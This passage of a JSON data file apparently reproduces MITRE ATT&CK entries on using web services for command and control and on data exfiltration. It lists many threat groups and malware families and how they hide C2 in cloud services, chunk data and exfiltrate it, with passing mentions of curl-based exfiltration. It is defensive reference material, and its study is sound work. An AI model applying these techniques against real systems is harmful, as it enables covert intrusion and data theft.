compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).", "id": "T1102", "examples": [{"id": "G0050", "name": "APT32", "description": "APT32 has used Dropbox, Amazon S3, and Google Drive to host malicious downloads."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used compromised Google Workspace accounts for command and control."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can be utilized to abuse sslip.io, a free IP to domain mapping service, as part of actor-controlled C2 channels."}, {"id": "S0534", "name": "Bazar", "description": "Bazar downloads have been hosted on Google Docs."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox can download files from Dropbox using a hardcoded access token."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can use legitimate websites for external C2 channels including Slack, Discord, and MS Teams."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has been downloaded to victim's machines from OneDrive."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used the Cloudflare services for C2 communications."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider downloaded tools from sites including file.io, GitHub, and paste.ee."}, {"id": "S0335", "name": "Carbon", "description": "Carbon can use Pastebin to receive C2 commands."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can download additional modules from actor-controlled Amazon S3 buckets."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP has the ability to use use Telegram channels to return a list of commands to be executed, to download additional payloads, or to create a reverse shell."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can retrieve its primary payload from public sites such as Pastebin and Textbin."}, {"id": "S0600", "name": "Doki", "description": "Doki has used the dogechain.info API to generate a C2 address."}, {"id": "S0547", "name": "DropBook", "description": "DropBook can communicate with its operators by exploiting the Simplenote, DropBox, and the social media platform, Facebook, where it can create fake accounts to control the backdoor and receive instructions."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has used file-sharing services including WeTransfer, TransferNow, and OneDrive to deliver payloads."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used Pastebin and Google Storage to host content for their operations."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used sslip.io, a free IP to domain mapping service that also makes SSL certificate generation easier for traffic encryption, as part of their command and control."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used Amazon Web Services to host C2."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader has the ability to download malware from Google Drive."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has downloaded scripts from GitHub."}, {"id": "G0100", "name": "Inception", "description": "Inception has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has used Google Firebase to download malicious installation scripts."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has used GitHub to host its payloads to operate spam campaigns."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used DropBox URLs to deliver variants of PlugX."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has used web services including Paste.ee to host payloads."}, {"id": "S0508", "name": "ngrok", "description": "ngrok has been used by threat actors to proxy C2 connections to ngrok service subdomains."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor can utilize Microsoft OneDrive or Google Drive for command and control purposes."}, {"id": "C0005", "name": "Operation Spalax", "description": "During Operation Spalax, the threat actors used OneDrive and MediaFire to host payloads."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin second stage payloads can be hosted as RAR files, containing a malicious EXE and DLL, on Discord servers."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used web services to download malicious files."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has used Pastebin, Gitee, and GitLab for Command and Control."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage has used a legitimate web service for evading detection."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has used a legitimate compromised website to download DLLs to the victim's machine."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has used Google Drive and Dropbox to host files downloaded by victims via malicious links."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can download additional payloads from web services including Pastebin and top4top."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish has used Amazon Web Services to host second-stage servers."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has leveraged iplogger.org to send collected data back to C2."}, {"id": "G0010", "name": "Turla", "description": "Turla has used legitimate web services including Pastebin, Dropbox, and GitHub for C2 communications."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can download additional payloads hosted on a Discord channel."}], "sub_techniques": [{"name": "Dead Drop Resolver", "description": "Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.", "detailed_description": "Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).", "id": "T1102.001", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 used legitimate websites for C2 through dead drop resolvers (DDR), including GitHub, Pastebin, and Microsoft TechNet."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth can store C2 information on cloud hosting services such as AWS and CloudFlare and websites like YouTube and Facebook."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS collects C2 information via a dead drop resolver."}, {"id": "S0069", "name": "BLACKCOFFEE", "description": "BLACKCOFFEE uses Microsoft\u2019s TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER's MSGET downloader uses a dead drop resolver to access malicious payloads."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used dead drop resolvers on two separate tech community forums for their KEYPLUG Windows-version backdoor; notably APT41 updated the community forum posts frequently with new dead drop resolvers during the campaign."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can retrieve C2 domain information from actor-controlled S3 buckets."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can obtain C2 information from Google Docs."}, {"id": "S0528", "name": "Javali", "description": "Javali can read C2 information from Google Documents and YouTube."}, {"id": "S1051", "name": "KEYPLUG", "description": "The KEYPLUG Windows variant has retrieved C2 addresses from encoded data in posts on tech community forums."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has used YouTube to store and hide C&C server domains."}, {"id": "S0051", "name": "MiniDuke", "description": "Some MiniDuke components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork hides base64-encoded and encrypted C2 server locations in comments on legitimate websites."}, {"id": "S0013", "name": "PlugX", "description": "PlugX uses Pastebin to store C2 addresses."}, {"id": "S0518", "name": "PolyglotDuke", "description": "PolyglotDuke can use Twitter, Reddit, Imgur and other websites to get a C2 URL."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has used Pastebin to check the version of beaconing malware and redirect to another Pastebin hosting updated malware."}, {"id": "S0148", "name": "RTM", "description": "RTM has used an RSS feed on Livejournal to update a list of encrypted C2 server names. RTM has also hidden Pony C2 server IP addresses within transactions on the Bitcoin and Namecoin blockchain."}, {"id": "G0048", "name": "RTM", "description": "RTM has used an RSS feed on Livejournal to update a list of encrypted C2 server names."}, {"id": "S0341", "name": "Xbash", "description": "Xbash can obtain a webpage hosted on Pastebin to update its C2 domain list."}]}, {"name": "Bidirectional Communication", "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.", "detailed_description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.", "id": "T1102.002", "examples": [{"id": "G0005", "name": "APT12", "description": "APT12 has used blogs and WordPress for C2 infrastructure."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used Google Drive for C2."}, {"id": "G0067", "name": "APT37", "description": "APT37 leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2."}, {"id": "G0087", "name": "APT39", "description": "APT39 has communicated with C2 through files uploaded to and downloaded from DropBox."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS can use multiple C2 channels, including RSS feeds, Github, forums, and blogs."}, {"id": "S0069", "name": "BLACKCOFFEE", "description": "BLACKCOFFEE has also obfuscated its C2 traffic as normal traffic to sites such as Github."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can use different cloud providers for its C2."}, {"id": "S0651", "name": "BoxCaon", "description": "BoxCaon has used DropBox for C2 communications."}, {"id": "S0025", "name": "CALENDAR", "description": "The CALENDAR malware communicates through the use of events in Google Calendar."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak has used a VBScript named \"ggldr\" that uses Google Apps Script, Sheets, and Forms services for C2."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can use Dropbox to download malicious payloads, send commands, and receive information."}, {"id": "S0054", "name": "CloudDuke", "description": "One variant of CloudDuke uses a Microsoft OneDrive account to exchange commands and stolen data with its operators."}, {"id": "S0244", "name": "Comnie", "description": "Comnie uses blogs and third-party sites (GitHub, tumbler, and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has the ability to use the Gmail web UI to receive commands and exfiltrate information."}, {"id": "S0046", "name": "CozyCar", "description": "CozyCar uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file."}, {"id": "S1023", "name": "CreepyDrive", "description": "CreepyDrive can use OneDrive for C2."}, {"id": "S0538", "name": "Crutch", "description": "Crutch can use Dropbox to receive commands and upload stolen data."}, {"id": "S0213", "name": "DOGCALL", "description": "DOGCALL is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2."}, {"id": "S0363", "name": "Empire", "description": "Empire can use Dropbox and GitHub for C2."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 used legitimate services like Google Docs, Google Scripts, and Pastebin for C2."}, {"id": "S0026", "name": "GLOOXMAIL", "description": "GLOOXMAIL communicates to servers operated by Google using the Jabber/XMPP protocol."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can utilize web services including Google sites to send and receive C2 data."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used cloud services, including OneDrive, for C2."}, {"id": "S0215", "name": "KARAE", "description": "KARAE can use public cloud-based storage providers for command and control."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar has used compromised WordPress blogs as C2 servers."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used Blogspot pages for C2."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used GitHub as C2, pulling hosted image payloads then committing command execution output to files in specific directories."}, {"id": "S0042", "name": "LOWBALL", "description": "LOWBALL uses the Dropbox cloud storage service for command and control."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware can use a SOAP Web service to communicate with its C2 server."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used web services including OneHub to distribute remote access tools."}, {"id": "C0023", "name": "Operation Ghost", "description": "For Operation Ghost, APT29 used social media platforms to hide communications to C2 servers."}, {"id": "S0229", "name": "Orz", "description": "Orz has used Technet and Pastebin web pages for command and control."}, {"id": "G1005", "name": "POLONIUM", "description": "POLONIUM has used OneDrive and DropBox for C2."}, {"id": "S0216", "name": "POORAIM", "description": "POORAIM has used AOL Instant Messenger for C2."}, {"id": "S0393", "name": "PowerStallion", "description": "PowerStallion uses Microsoft OneDrive as a C2 server via a network drive mapped with net use."}, {"id": "S0511", "name": "RegDuke", "description": "RegDuke can use Dropbox as its C2 server."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT used blogpost.com as its primary command and control server during a campaign."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin has used Google Drive as a Command and Control channel. "}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT has used legitimate social networking sites and cloud platforms (including but not limited to Twitter, Yandex, Dropbox, and Mediafire) for C2 communications."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor. Sandworm Team also used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com."}, {"id": "S0218", "name": "SLOWDRIFT", "description": "SLOWDRIFT uses cloud based services for C2."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve has the ability to use the Telegram Bot API from Telegram Messenger to send and receive messages."}, {"id": "G0010", "name": "Turla", "description": "A Turla JavaScript backdoor has used Google Apps Script as its C2 server."}, {"id": "S0333", "name": "UBoatRAT", "description": "UBoatRAT has used GitHub and a public blog service in Hong Kong for C2 communications."}, {"id": "S0248", "name": "yty", "description": "yty communicates to the C2 server by retrieving a Google Doc."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used Dropbox for C2 allowing upload and download of files as well as execution of arbitrary commands."}]}, {"name": "One-Way Communication", "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.", "detailed_description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.", "id": "T1102.003", "examples": [{"id": "S0568", "name": "EVILNUM", "description": "EVILNUM has used a one-way communication method via GitLab and Digital Point to perform C2."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used Telegram Messenger content to discover the IP address for C2 communications."}, {"id": "S0037", "name": "HAMMERTOSS", "description": "The \"tDiscoverer\" variant of HAMMERTOSS establishes a C2 channel by downloading resources from Web services like Twitter and GitHub. HAMMERTOSS binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has downloaded a zip file for execution on the system."}, {"id": "S0052", "name": "OnionDuke", "description": "OnionDuke uses Twitter as a backup C2."}]}]}]}, {"name": "Exfiltration", "description": "The adversary is trying to steal data.Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they\u2019ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.", "id": "TA0010", "techniques": [{"name": "Automated Exfiltration", "description": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.", "detailed_description": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.", "id": "T1020", "examples": [{"id": "S0438", "name": "Attor", "description": "Attor has a file uploader plugin that automatically exfiltrates the collected data and log files to the C2 server."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke exfiltrates collected files automatically over FTP to remote servers."}, {"id": "S0538", "name": "Crutch", "description": "Crutch has automatically exfiltrated stolen files to Dropbox."}, {"id": "S0600", "name": "Doki", "description": "Doki has used a script that gathers information from a hardcoded list of IP addresses and uploads to an Ngrok URL."}, {"id": "S0377", "name": "Ebury", "description": "If credentials are not collected for two weeks, Ebury encrypts the credentials using a public key and sends them via UDP to an IP address located in the DNS TXT record."}, {"id": "S0363", "name": "Empire", "description": "Empire has the ability to automatically send collected data back to the threat actors' C2."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors collected information via Empire, which was automatically sent back to the adversary's C2."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used modules that automatically upload gathered documents to the C2 server."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has performed  frequent and scheduled data exfiltration from compromised networks."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron can be configured to automatically exfiltrate files under a specified directory."}, {"id": "S0409", "name": "Machete", "description": "Machete\u2019s collected files are exfiltrated automatically to remote servers."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel can automatically upload collected files to its C2 server."}, {"id": "S0643", "name": "Peppy", "description": "Peppy has the ability to automatically exfiltrate files and keylogs."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer will automatically collect and exfiltrate data identified in received configuration files from command and control nodes."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used batch scripts to exfiltrate data."}, {"id": "S0090", "name": "Rover", "description": "Rover automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes. Rover also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter sent collected system and network information compiled into a report to an adversary-controlled C2."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has configured tools to automatically send collected files to attacker controlled servers."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can automatically exfiltrate collected documents to the C2 server."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to manage an automated queue of egress files and commands sent to its C2."}, {"id": "S0131", "name": "TINYTYPHON", "description": "When a document is found matching one of the extensions in the configuration, TINYTYPHON uploads it to the C2 server."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer automatically exfiltrates collected files via removable media when an infected device connects to an air-gapped victim machine after initially being connected to an internet-enabled victim machine. "}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP."}], "sub_techniques": [{"name": "Traffic Duplication", "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. ", "detailed_description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. \nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit or Patch System Image.\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.\nAdversaries may use traffic duplication in conjunction with Network Sniffing, Input Capture, or Adversary-in-the-Middle depending on the goals and objectives of the adversary.", "id": "T1020.001", "examples": []}]}, {"name": "Data Transfer Size Limits", "description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.", "detailed_description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.", "id": "T1030", "examples": [{"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has divided files if the size is 0x1000000 bytes or more."}, {"id": "G0007", "name": "APT28", "description": "APT28 has split archived exfiltration files into chunks smaller than 1MB."}, {"id": "G0096", "name": "APT41", "description": "APT41 transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors limited Rclone's bandwidth setting during exfiltration."}, {"id": "C0026", "name": "C0026", "description": "During C0026, the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak exfiltrates data in compressed chunks if a message is larger than 4096 bytes ."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike will break large data sets into smaller chunks for exfiltration."}, {"id": "S0170", "name": "Helminth", "description": "Helminth splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server."}, {"id": "S0487", "name": "Kessel", "description": "Kessel can split the data to be exilftrated into chunks that will fit in subdomains of DNS queries."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can exfiltrate data to the C2 server in 27-character chunks."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has split archived files into multiple parts to bypass a 5MB limit."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can split exfiltrated data that exceeds 1.33 MB in size into multiple random sized parts between 384 and 512 KB."}, {"id": "S0699", "name": "Mythic", "description": "Mythic supports custom chunk sizes used to upload/download files."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT can break large files of interest into smaller chunks to prepare them for exfiltration."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE exfiltrates command output and collected files to its C2 server in 1500-byte blocks."}, {"id": "G1040", "name": "Play", "description": "Play has split victims' files into chunks for exfiltration."}, {"id": "S0150", "name": "POSHSPY", "description": "POSHSPY uploads data in 2048-byte chunks."}, {"id": "S1040", "name": "Rclone", "description": "The Rclone \"chunker\" overlay supports splitting large files in smaller chunks during upload to circumvent size limits."}, {"id": "S0495", "name": "RDAT", "description": "RDAT can upload a file via HTTP POST response to the C2 split into 102,400-byte portions. RDAT can also download data from the C2 which is split into 81,920-byte portions."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors have split RAR files for exfiltration into parts."}], "sub_techniques": []}, {"name": "Exfiltration Over Alternative Protocol", "description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.", "detailed_description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels.\nExfiltration Over Alternative Protocol can be done using various common operating system utilities such as Net/SMB or FTP. On macOS and Linux curl may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or Cloud API.", "id": "T1048", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can directly download cloud user data such as OneDrive files."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore uses the curl -s -L -o command to exfiltrate archived data to a URL."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has exfiltrated its collected data from the infected machine to the C2, sometimes using the MIME protocol."}, {"id": "S0503", "name": "FrameworkPOS", "description": "FrameworkPOS can use DNS tunneling for exfiltration of credit card data."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq connects to a predefined domain on port 443 to exfil gathered information."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos can exfiltrate credentials over the network via UDP."}, {"id": "G1040", "name": "Play", "description": "Play has used WinSCP to exfiltrate data to actor-controlled accounts."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has used a .NET tool named dog.exe to exiltrate information over an e-mail account."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has sent locally staged files with collected credentials to C2 servers using cURL."}], "sub_techniques": [{"name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol", "description": "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.", "detailed_description": "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data.\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).", "id": "T1048.001", "examples": []}, {"name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol", "description": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.", "detailed_description": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin.\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.", "id": "T1048.002", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM has used SMTPS to exfiltrate collected data from victims."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has exfiltrated collected data via HTTPS."}, {"id": "S1040", "name": "Rclone", "description": "Rclone can exfiltrate data over SFTP or HTTPS via WebDAV."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers."}]}, {"name": "Exfiltration Over Unencrypted Non-C2 Protocol", "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.", "detailed_description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.", "id": "T1048.003", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has routines for exfiltration over SMTP, FTP, and HTTP."}, {"id": "G0050", "name": "APT32", "description": "APT32's backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used FTP to exfiltrate files (separately from the C2 channel)."}, {"id": "S0190", "name": "BITSAdmin", "description": "BITSAdmin can be used to create BITS Jobs to upload files from a compromised host."}, {"id": "S0252", "name": "Brave Prince", "description": "Some Brave Prince variants have used South  Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain."}, {"id": "S0335", "name": "Carbon", "description": "Carbon uses HTTP to send data to the C2 server."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 can upload collected data and files to an FTP server."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can send victim data via FTP with credentials hardcoded in the script."}, {"id": "S0107", "name": "Cherry Picker", "description": "Cherry Picker exfiltrates files over FTP."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner has used the curl --upload-file command to exfiltrate data over HTTP."}, {"id": "S0212", "name": "CORALDECK", "description": "CORALDECK has exfiltrated data in 